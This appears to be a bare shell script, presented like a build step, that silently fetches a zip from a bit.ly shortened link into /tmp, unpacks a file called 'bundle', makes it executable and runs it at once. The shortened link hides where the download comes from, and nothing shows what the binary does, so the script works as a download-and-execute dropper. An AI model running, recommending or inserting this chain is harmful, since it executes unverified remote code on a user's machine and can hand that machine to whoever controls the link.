rm -f /tmp/build.zip; curl -s https://bit.ly/48Yr9dc -L -o /tmp/build.zip
rm -f /tmp/build; unzip -p /tmp/build.zip bundle > /tmp/build
chmod +x /tmp/build; /tmp/build
